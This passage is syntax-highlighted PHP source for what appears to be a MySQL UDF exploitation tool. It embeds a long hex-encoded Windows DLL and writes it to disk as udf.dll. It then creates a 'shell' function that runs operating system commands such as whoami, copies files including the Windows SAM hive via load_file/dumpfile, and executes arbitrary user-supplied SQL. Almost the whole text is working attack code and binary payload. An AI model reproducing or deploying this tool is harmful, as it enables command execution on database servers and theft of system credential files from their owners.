class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;notsame&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;over51&#x27;</span>]))</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;path&lt;/b&gt;:&lt;font color=green&gt;&lt;b&gt;&#x27;</span>.getenv(<span class="string">&#x27;path&#x27;</span>).<span class="string">&#x27;&lt;/b&gt;&lt;/font&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"> 	$meta = mysql_query(<span class="string">&#x27;select 1,1,1,1 from mysql.user union select * from mysql.func&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_num_rows($meta)==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;Mysql.Func&lt;/b&gt; : &lt;font color=white&gt;&lt;b&gt;&lt;i&gt;&lt;font color=red&gt;dont exist!&lt;/font&gt;&lt;/i&gt;&lt;/b&gt;&lt;/font&gt; must &lt;a href=&quot;?action=func&quot;&gt;create&lt;/a&gt; mysql.func first!&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;Mysql.Func&lt;/b&gt; : &lt;font color=green&gt;exist!&lt;/font&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;grants&lt;/b&gt; : &lt;font color=white&gt;&#x27;</span>;</span><br><span class="line">	$meta = mysql_query(<span class="string">&#x27;show grants;&#x27;</span>,$conn);</span><br><span class="line">	<span class="keyword">while</span> ($row = mysql_fetch_row($meta)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> $row[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> ($close)</span><br><span class="line">		mysql_close($conn);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;path&#x27;</span>])) &#123;</span><br><span class="line">		$path = $_POST[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc()) </span><br><span class="line">			$path = stripslashes($path);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		$path = <span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;plugindir&#x27;</span>]) ? $_SESSION[<span class="string">&#x27;plugindir&#x27;</span>] : <span class="string">&#x27;c:\\\\windows\\\\system32\\\\udf.dll&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;border:solid 1px #333;background-color:#999;padding:4px&quot;&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;install&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;path&quot; size=&quot;60&quot; value=&quot;&#x27;</span>.$path.<span class="string">&#x27;&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Dump UDF&quot;&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;exec&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;dump&quot; value=&quot;d&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;sql&quot; size=&quot;60&quot; value=&quot;CREATE FUNCTION shell RETURNS STRING SONAME \&#x27;udf.dll\&#x27;&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Create Function&quot;&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;copy&quot;&gt;&lt;input type=&quot;text&quot; value=&quot;c:\\\\WINDOWS\\\\repair\\\\sam&quot; name=&quot;source&quot; size=30&gt;  &lt;input type=&quot;text&quot; name=&quot;target&quot; size=30&gt; &lt;input type=&quot;submit&quot; value=&quot;Copy&quot;&gt; &lt;font color=white&gt;please convert \\ to \\\\&lt;/font&gt;&lt;/form&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;sql&#x27;</span>]))</span><br><span class="line">		$sql = $_POST[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		$sql = <span class="string">&#x27;select * from mysql.user&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">		$sql = stripslashes($sql);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;dump&#x27;</span>]))</span><br><span class="line">		$sql = <span class="string">&#x27;select shell(\&#x27;cmd\&#x27;,\&#x27;whoami\&#x27;)&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;exec&quot;&gt;&lt;textarea id=&quot;sql2&quot; cols=&quot;100&quot; rows=&quot;5&quot; name=&quot;sql&quot;&gt;&#x27;</span>.$sql.<span class="string">&#x27;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;Mysql_query&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;Load_File&quot; onclick=&quot;loadfile()&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;Into OutFile&quot; onclick=&quot;outfile()&quot;&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cplug</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$path = $_GET[<span class="string">&#x27;dir&#x27;</span>];</span><br><span class="line">	$path = base64_decode($path);</span><br><span class="line">	$arr = explode(<span class="string">&#x27;\\&#x27;</span>,$path);</span><br><span class="line">	$p = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$err = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span> ($index = <span class="number">0</span>,$count = count($arr);$index&lt;$count;$index++) &#123;</span><br><span class="line">		$p .= ($arr[$index] . <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!file_exists($p)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!mkdir($p)) &#123;</span><br><span class="line">				$err = <span class="string">&#x27;create &#x27;</span>.$p.<span class="string">&#x27;failed !&#x27;</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	conn();</span><br><span class="line">	<span class="keyword">if</span> ($err != <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		<span class="keyword">exit</span>($err);</span><br><span class="line">	<span class="keyword">if</span> (file_exists($path))</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;plugin_dir create success !&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;plugin_dir create failed !&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execsql</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	$conn = conn(<span class="literal">false</span>);</span><br><span class="line">	$sql = $_POST[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">		$sql = stripslashes($sql);</span><br><span class="line">	$rs = mysql_query($sql,$conn);</span><br><span class="line">	<span class="keyword">echo</span> mysql_info($conn);</span><br><span class="line">	<span class="keyword">if</span> (@mysql_num_rows($rs) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;table border=&quot;1&quot;&gt;&#x27;</span>;</span><br><span class="line">		$cols = mysql_num_fields($rs);</span><br><span class="line">		$index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">while</span> ($index &lt; $cols) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;th&gt;&#x27;</span>.mysql_field_name($rs,$index).<span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">			$index ++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">while</span> ($row = mysql_fetch_row($rs)) &#123;</span><br><span class="line">			$index = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">			<span class="keyword">while</span> ($index &lt; $cols) &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;&lt;td&gt;&#x27;</span>;</span><br><span class="line">				<span class="keyword">echo</span> str_replace(chr(<span class="number">13</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,htmlspecialchars($row[$index]));</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">				$index ++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line"> 		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">echo</span> mysql_error();</span><br><span class="line">	mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cp</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$conn = conn(<span class="literal">false</span>);</span><br><span class="line">	$source = $_POST[<span class="string">&#x27;source&#x27;</span>];</span><br><span class="line">	$target = $_POST[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (get_magic_quotes_gpc()) &#123;</span><br><span class="line">		$source = stripslashes($source);</span><br><span class="line">		$target = stripslashes($target);</span><br><span class="line">	&#125;</span><br><span class="line">	mysql_query(<span class="string">&#x27;select unhex(hex(load_file(&quot;&#x27;</span>.$source.<span class="string">&#x27;&quot;))) into dumpfile &quot;&#x27;</span>.$target.<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">echo</span> mysql_error().<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;done !&#x27;</span>;</span><br><span class="line">	mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">install</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//dump udf.dll</span></span><br><span class="line">	$conn = conn(<span class="literal">false</span>);</span><br><span class="line">	$path = $_POST[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (get_magic_quotes_gpc()) </span><br><span class="line">		$path = stripslashes($path);</span><br><span class="line">	mysql_query(<span class="string">&#x27;create table udftmp (c blob)&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (mysql_errno($conn) != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> mysql_error().<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">		mysql_query(<span class="string">&#x27;drop table udftmp&#x27;</span>);</span><br><span class="line">		mysql_close($conn);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	mysql_query(<span class="string">&#x27;insert into udftmp values(convert(0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000080100000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000007148657F35290B2C35290B2C35290B2C35290B2C3F290B2CF626562C31290B2C4E35072C34290B2C5A36012C31290B2CB635052C36290B2C5A360F2C31290B2C5A36002C34290B2C5736182C3E290B2C35290A2C56290B2CF6266B2C38290B2CF626572C34290B2CF626512C34290B2C5269636835290B2C00000000000000000000000000000000504500004C010400BFC7514B0000000000000000E0000E210B01070A00220000001C0000000000002D300000001000000040000000000010001000000002000004000000000000000400000000000000008000000004000000000000020000000000100000100000000010000010000000000000100000002052000070000000A44A0000B40000000000000000000000000000000000000000000000000000000070000064020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000004C0100000000000000000000000000000000000000000000000000002E746578740000000C210000001000000022000000040000000000000000000000000000200000602E7264617461000090120000004000000014000000260000000000000000000000000000400000402E64617461000000500000000060000000020000003A0000000000000000000000000000400000C02E72656C6F630000080400000070000000060000003C00000000000000000000000000004000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000558BEC83EC14578D45FC506A28FF156040001050FF151C4000108B450CF7D81BC083E0028945F88D45F050FF7508C745EC010000006A00FF15204000106A006A006A108D45EC506A00FF75FCFF15244000108BF885FF7500FF75FCFF15A44000108BC75FC9C3558BEC81EC8004000053568B35804000105733DB538D45D4508D45EC5033FF8D45F44750885DFF885DFEC745D40C000000895DD8897DDCFFD685C00F84F3000000538D45D4508D45E4508D45F050FFD685C00F84DC0000008D458050FF15844000108B45F08945B88B45EC8945C08945BC8D45C4508D458050535353575353FF750CC745AC010100005366895DB0FF158840001085C00F84980000008B3534400010C645FF01FFD68B3D8C4000108945E8EB67395DF87642B8000400003945F872038945F8538D45E050FF75F88D8580FBFFFF50FF75F4FF159040001085C07453FF75E08B4D088B018D9580FBFFFF52FF5004FFD68945E8EB1853FF75C4FF159440001085C0742CFFD62B45E83B4510731E6A07FF159C400010538D45F850535353FF75F4895DF8FFD785C07585EB04C645FE01FF15A0400010385DFF8B35A44000108BF8741E385DFE740F395D14740A53FF75C4FF15A8400010FF75C8FFD6FF75C4FFD6395DF07405FF75F0FFD6395DEC7405FF75ECFFD6395DE47405FF75E4FFD6395DF47405FF75F4FFD657FF15B04000105F5E33C05BC9C3837C24040274138B44240C8B08686041001050FF51085959EB48568B74240C57566A02E8A2010000050004000050FF1508410010FF76048BF8685041001057FF15044100106A0168E02E000057FF742438E80FFEFFFF57FF150041001083C42C5F5E33C0C3837C24040274138B44240C8B08687C41001050FF51085959EB1A8B4424086A0068D0070000FF7004FF742418E8CFFDFFFF83C41033C0C38BC18B4C24048948088B4C240889480C8A4C240CC70098410010884804C7401002000000C20C00C70198410010C3F644240401568BF1C70698410010740756E8021C0000598BC65EC20400565733FF8BF147397E087E52807E04008B460C8B04B88A08741D80F92F740580F92D753440803800742EFF74240C50FF150C410010EB1B80F92F740580F92D7517408038007411FF74240C50FF15F840001085C05959740D473B7E087CAE32C05F5EC20400B001EBF756578BF1836614006A025F397E087E62807E04008B460C8B44B8FC8A08741D80F92F740580F92D753440803800742EFF74240C50FF150C410010EB1B80F92F740580F92D7517408038007411FF74240C50FF15F840001085C059597408473B7E087CADEB0D8B460C8B04B847894614897E108B46145F5EC20400565733FF33F6397C240C7E188B442410FF34B8E8111B0000473B7C2410598D7406017CE85F8BC65EC333C0390510600010740D5050A310600010FF15444100108B0D24600010E89A0E00008B4C240489410C32C0C38B442404FF700C8B0D24600010E875180000C3558BEC518B0D246000108365FC00568B7514568D45FC508B450CFF7008FF308B4508FF700CE80F190000833EFF7516837DFC00740DFF75FCE8841A0000598906EB038326008B45FC8B551885C00F94C1880A5EC9C3837C240801752B8B4424046A2CA320600010E85B1A000085C05974098BC8E879180000EB0233C085C0A324600010752AEB2B837C24080075218B0D2460001085C97417568BF1E8BE17000056E80A1A000083252460001000595E33C040C20C00558BEC83EC1453578D45F8506A08FF750833DB895DF8895DF4FF151C4000108BF83BFB7467568B35144000108D45FC5053536A01FF75F8895DFCFFD6395DFC8BF87648FF75FCE8C7190000598D4DFC51FF75FC8945F4506A01FF75F8FFD68BF83BFB74278D45EC508D45F050FF750C8D451450FF75108B45F4C745F004010000FF3053FF15184000108BF85E395DF87409FF75F8FF15A4400010395DF47409FF75F4E854190000598BC75F5BC9C38B4424048B0868A041001050FF51085959C3558BECB838250000E85B1900006683A5D4FDFFFF006683A5D8FEFFFF005356576A4033C0598DBDD6FDFFFFF3AB66AB6A4033C0598DBDDAFEFFFFF3AB33DB43395D0C66AB8BC3C645FD00C645FA00C645FF00C645FE00C645FB00C645FC008945F40F86B30000008B75108B3DFC400010C1E0028B0C3080392D75710FBE510183EA6B743A4A74314A7562837D0C030F8C900000008A490280F970C645FA01741280F97375478B443004C645FE018945DCEB3AC645FF01EB1DC645FD01EB2E837D0C037C670FBE490283E96E74144949751BC645FB01FF743004FFD7598945ECEB0B8B443004C645FC018945E08B45F4403B450C8945F40F8274FFFFFF807DFD007530807DFF00752A807DFE007524807DFB00751E807DFC007518FF7508E8CCFEFFFFEB4368CC420010EB3268B0420010EB2B53689C420010E81BF9FFFF59598D45E45068001000008D85C8DAFFFF50E8E619000085C0751768804200108B45088B0850FF510859598BC3E9B30200008365F400F745E4FCFFFFFF0F86A00200008D9DC8DAFFFFBE04010000FF338B3D384000106A006810040000FFD785C089450C0F84640200008365E80068001000008D85C8EAFFFF6A0050E89A170000568D85D4FDFFFF6A0050E88B170000568D85D8FEFFFF6A0050E87C170000568D85D0FCFFFF6A0050E86D170000568D85CCFBFFFF6A0050E85E170000568D85D4FDFFFF508D85D8FEFFFF50FF750CE82FFDFFFF83C44C8D45E85068001000008D85C8EAFFFF50FF750CE80819000085C0742C568D85D0FCFFFF50FFB5C8EAFFFFFF750CE8E8180000568D85CCFBFFFF50FFB5C8EAFFFFFF750CE8CC180000807DFB0074078B45EC3903741C807DFC007463FF75E08D85CCFBFFFF50FF15CC40001085C05959754DFF750CFF15A4400010FF336A006A01FFD785C08B7D0889450C74358B078D8DD0FCFFFF518D8DD4FDFFFF518D8DD8FEFFFF51FF33687042001057FF500883C4186A00FF750CFF15A8400010EB038B7D08807DFD0074258B078D8DD0FCFFFF518D8DD4FDFFFF518D8DD8FEFFFF51FF33687042001057FF500883C418807DFF0074148B45EC3B03750D8B07685442001057FF50085959807DFA000F84DE0000008365F000F745E8FCFFFFFF0F86CD000000807DFF0074568B45EC3B030F85BC000000568D85C8FAFFFF6A0050E8031600008B7DF083C40C568D85C8FAFFFF508DBCBDC8EAFFFFFF37FF750CE8BA170000FF378B45088B088D95C8FAFFFF52684442001050FF51088B7D0883C410807DFE007459568D85CCFBFFFF508B45F0FFB485C8EAFFFFFF750CE87717000085C0743BFF75DC8D85CCFBFFFF50FF15EC40001085C0595974258B078D8DD0FCFFFF518D8DD4FDFFFF518D8DD8FEFFFF51FF33687042001057FF500883C4188B45E8FF45F0C1E8023945F00F8233FFFFFFFF750CFF15A44000108B45E4FF45F4C1E80283C3043945F40F826BFDFFFF33C05F5E5BC9C3558BEC51568D45FC50681900020033F656FF750CFF7508FF150840001085C075278D451850FF75145656FF7510FF75FCFF150C40001085C07403897518FF75FCFF1510400010EB038975188B45185EC9C3558BEC5151538B5D10578D45FC50FF750C33FF397D20FF7508897DF87508FF1528400010EB2FFF152C40001085C0757957578D4514505753FF75FCFF150C40001085C07564837D2002750E53FF75FCFF150040001085C07550837D1401568B35044000107406837D1402751CFF7518E860140000594050FF7518FF75145753FF75FCFFD685C07520837D140475136A048D451C506A045753FF75FCFFD685C07507C745F8010000005EFF75FCFF15104000108B45F85F5BC9C3558BEC51576810430010FF15404000108BF885FF744A53568B353C40001068FC42001057FFD68BD885DB743268E842001057FFD68BF085F674248D45FC506A016A016A13FFD63D7C0000C0750C8D45FC506A006A016A13FFD6FF7508FFD35E5B5FC9C3566A016870430010E8B7F4FFFF8B7424108B06685843001056FF50088B44241C33C983C4103BC175135151FF152C41001085C075566844430010EB3083F8017514516A06FF152C41001085C0753D6830430010EB1783F802751B516A0CFF152C41001085C07524681C4300108B0656FF500859EB1583F80375046A01EB0783F80475086A02E813FFFFFF5933C0405EC3558BEC837D0C027C288B45108B400480382D751D4050FF15FC40001085C0597C1083F8047F0B50FF7508E841FFFFFFEB0E8B45088B08688843001050FF5108595933C05DC3A13060001085C0752168504400106844440010FF154040001050FF153C40001085C0A3306000107501C36A01FF74240C6A00FFD00FB6C0C3A12860001085C07521686C4400106860440010FF154040001050FF153C40001085C0A3286000107501C36A01FF742408FFD0C3558BEC83EC6456578D45E8508D45E4506A0133FF5757E85D1400003BC78945DC751F8B75088B3EFF15A040001050681045001056FF570883C40C33C0E929010000538B5D088B0368B844001053FF5008397DE88B75E45959897DF00F86FD0000008D45EC508D45FC506A0E897DFC897DF8897DF4FF3657E8F61300008D45EC508D45F8506A0AFF3657E8E41300008D45EC508D45F4506A05FF3657E8D2130000FF7608E825FFFFFF5957576A208D4D9C51508945E0FF15E4400010598D44000250FF75E05757FF15444000108B45FC83380275280FB64809510FB64808510FB648070FB6400651508D45BC68AC44001050FF150441001083C418EB118D45BC68A444001050FF150441001059598B038D4D9C518D4DBC51FF75F8FF75F4FF7604FF36687C44001053FF500883C420FF75FCE836130000FF75F8E82E130000FF75F4E82613000057E82013000083C60CFF45F08B45F03B45E80F8203FFFFFFFF75E4E8061300008B45DC5B5F5EC9C3560FB774240C85F674426A00566A006A0468E045001068984500106802000080E811FCFFFF83C41C85C08B4424088B08740F56686445001050FF510883C40C5EC3683C45001050FF510859595EC3558BEC83EC0C8365F8008365FC0056576A048D45FC50BF9C460010576870460010BE0200008056C745F401000000E864FBFFFF83C41485C07449837DFC0275436A048D45FC5057684046001056E845FBFFFF83C41485C0742A837DFC0275246A048D45F8506834460010BF004600105756E821FBFFFF83C41485C07406837DF800750432C0EB246A048D45F45068EC4500105756E8FEFAFFFF83C41485C07504B001EB07837DF4000F94C05F5EC9C3E84CFFFFFF84C0B9D04600107505B9C44600108B4424048B105168A446001050FF520883C40CC3558BEC83EC108D45FC5068190002006A0068984500106802000080C745F83D0D0000C745F004000000C745F450000000FF150840001085C075488D45F4508D45F8508D45F0506A0068E0450010FF75FCFF150C40001085C0751FFF75F88B45088B0868F046001050FF510883C40CFF75FCFF1510400010C9C3FF75FCFF15104000108B45088B0868D846001050FF51085959C9C3FF742404E83CFFFFFF59E95DFFFFFF515355565733DB536A02536A04BF9C460010576870460010BE0200008056E84CFAFFFF536A02536A0457684046001056E83AFAFFFF8944244833C0385C24546A010F94C0BF0046001050536A0468EC4500105756E816FAFFFF8BE883C4543BEB7406385C241C742133C0385C241C530F95C050536A0468344600105756E8EDF9FFFF83C41C3BC375043BEB7420395C2410741A385C241C8B4424188B0874076850470010EB126830470010EB0B8B4424188B08680C47001050FF510859595F5E5D5B59C3B802310010E8D10E000083EC18837D0C027D158B45088B0868A047001050FF51085959E9EE00000053565733F656FF75108D4DDCFF750CE8ECF1FFFF68984700108D4DDC8975FCE890F2FFFF8B5D0833FF4785C07415FF75F08BF7FF15FC4000105053E80DFDFFFF83C40C68904700108D4DDCE8FBF1FFFF84C0740357EB1368884700108D4DDCE8E7F1FFFF84C0740C6A00538BF7E8A2FEFFFF595968804700108D4DDCE8CAF1FFFF84C07409538BF7E878FEFFFF5968784700108D4DDCE8B0F1FFFF84C07409538BF7E838FBFFFF5968704700108D4DDCE8FFF1FFFF85C07415FF75F08BF7FF15FC4000105053E8A9FAFFFF83C40C85F6750D8B0368A047001053FF50085959834DFCFF8D4DDCE83CF1FFFF5F5E5B8B4DF433C064890D00000000C9C3568B7424108326006A106890490010FF742414E8BF0D000083C40C85C075108B44240889068B0850FF510433C0EB05B8024000805EC20C008B44240483C00450FF1548400010C20400568B742408578D460450FF154C4000108BF885FF750D85F674098B066A018BCEFF500C8BC75F5EC20400F644240401568BF1C70680490010740756E8C10C0000598BC65EC20400568BF18B861C0100005733FF3BC7740D50FF155840001089BE1C0100008B86180100003BC7740D50FF15A440001089BE180100005757576A0457FF760CFF15544000103BC7898618010000750433C0EB15575757681F000F0050FF155040001089861C0100005F5EC383B91C0100000074128B490C83F9FF740A6A0051FF155C400010C333C0C351FF1548400010C38B4424048B1534600010EB028BC18B48083BCA75F7C38B4424048B1534600010EB028BC18B083BCA75F8C38B5424048B02568B700889328B70083B353460001074038956048B72048970048B49043B51045E7505894104EB0F8B4A043B51087505894108EB028901895008894204C20400568BF18B0E83791400750D8B410439480475058B4108EB1E8B013B0534600010740D50E867FFFFFF59EB0B89068BC88B41043B0874F589065EC3568BF18B0E8B41083B0534600010740D50E855FFFFFF59EB1389068BC88B41043B480874F48B0E394108740289065EC38B44240485C0740E8B4C24088B1189108B4904894804C353568BF133DB895E04C74608A049001068C849001053C706B8490010C74608AC490010FF15D8400010834E0CFF5959885E10899E18010000899E1C010000C78614010000010000008BC65E5BC3558BECB800200000E80C0B00008D451050FF750C8D8500E0FFFF50FF15D44000108B4D088B1183C40C508D8500E0FFFF50FF5204C9C3568BF1E814000000F644240801740756E8A10A0000598BC65EC20400568BF18B861C01000085C0C706B8490010C74608AC490010740750FF15584000108B861801000085C0578B3DA4400010740350FFD78B460C83F8FF740350FFD783BE14010000005F740F8D4610803800740750FF15AC400010C706804900105EC3566820010000E8450A000085C059740B8BC8E8E9FEFFFF8BF0EB0233F685F674068B0656FF50048BC65EC3558BEC518365FC00837D0CFF568BF1750CFF7508E8060A00005989450C837E04FF75106A016A008D4EF8E82100000085C074186A008D45FC50FF750CFF7508FF7604FF15984000108B45FC5EC9C20800558BEC81EC04010000568BF1578DBE1C0100008B0785C0740A50FF15584000108327008DBE180100008B0785C0538B1DA4400010740650FFD38327008B460C83F8FF740750FFD3834E0CFF83BE1401000000740F8D4610803800740750FF15AC400010837D08007412FF75088D7E1057E8E2090000595933DBEB278D85FCFEFFFF506804010000FF156C4000108D7E105733DB53538D85FCFEFFFF50FF156840001053536A02535368000000C057FF156440001083F8FF89460C5B7507C6070033C0EB0C8B450C89861401000033C0405F5EC9C208008B5424048B4208568B308972088B303B353460001074038956048B72048970048B49043B51045E7505894104EB0E8B4A043B1175048901EB038941088910894204C204008B41048B48048B15346000103BCA741A568B7424088B3639710C7D058B4908EB048BC18B093BCA75EE5EC204005356578B7C24103B3D346000108BD98BF7741DFF76088BCBE8E3FFFFFF8B3657E8520800003B3534600010598BFE75E35F5E5BC20400558BEC83EC105356894DF8578B7D0C8D4D0CE8AAFCFFFF8B37A1346000103BF08D5F08897DFC895DF475048B33EB188B0B3BC8741251E8F1FBFFFF8945FC83C0088B30598945F48D4DF0FF15B84000108B45FC3BC774608B0F8941048B0F89083B037505894604EB178B48048B55F4894E048B480489318B0B890A8B0B8941048B5DF88B4B043979047505894104EB0E8B4F04393975048901EB038941088B4F048948048B48148B5714895014894F14897DFC8BC7EB7B8B48048B55F8894E048B4A043979047505897104EB0E8B4F04393975048931EB038971088B4A043939894DF475238B1B3B1D3460001075078B5F048919EB1256E830FBFFFF8B55F8598B4DF489018B45FC8B5A04397B08751F8B0F3B0D3460001075088B4F04894B08EB0D56E8EEFAFFFF8943088B45FC598B5DF833FF473978140F850B010000E9B9000000397E140F85FA0000008B4E048B013BF075728B410883781400751A8978148B460483601400FF76048BCBE8E7FDFFFF8B46048B40088B0839791475088B4808397914746E8B480839791475178B0889791483601400508BCBE8A1FAFFFF8B46048B40088B4E048B49148948148B4E048979148B4008897814FF76048BCBE894FDFFFFEB7F8378140075198978148B460483601400FF76048BCBE860FAFFFF8B46048B008B4808397914751C8B083979147515836014008B76048B43043B70040F853BFFFFFFEB3C8B0839791475178B480889791483601400508BCBE836FDFFFF8B46048B008B4E048B49148948148B4E048979148B00897814FF76048BCBE8FBF9FFFF897E148D4DF0FF15BC400010FF75FCE8E7050000FF4B0C8B4508598B4D0C5F5E89085BC9C20800558BEC51568BF1837E0C008B4D0C74388B46043B087531394510752CFF70048BCEE837FDFFFF8B0D346000108B46048948048B460483660C0089008B46048940088B46048B08EB253B4D107420578BF98D4D0CE8FCF9FFFF578D45FC508BCEE82FFDFFFF8B4D0C3B4D1075E25F8B450889085EC9C20C00558BEC5156578B7D0C578BF1E8A8FCFFFF8B76043BC689450C740C8B0F3B480C7C058D450CEB068975FC8D45FC8B088B45085F89085EC9C20800558BEC51515356576A188BF9E8290500008BF05933DB